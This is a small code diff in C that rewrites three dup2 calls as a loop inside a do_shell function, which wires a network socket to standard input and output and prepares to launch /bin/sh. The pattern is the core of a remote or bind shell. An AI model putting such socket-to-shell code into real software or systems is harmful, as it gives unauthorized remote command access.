@@ -96,9 +96,8 @@ void communicate(int client, int other) {
 
 void do_shell(int sock) {
 	int r;
-	syscall(SC_DUP2, sock, 0, 0, 0, 0);
-	syscall(SC_DUP2, sock, 1, 0, 0, 0);
-	syscall(SC_DUP2, sock, 2, 0, 0, 0);
+	for (r = 0; r < 3; r++)
+		syscall(SC_DUP2, sock, r, 0, 0, 0);
 	char *argv[] = {"/bin/sh", 0};
 	char *envp[] = {0};
 	fputstring(sock, "1 Launching shell\n");
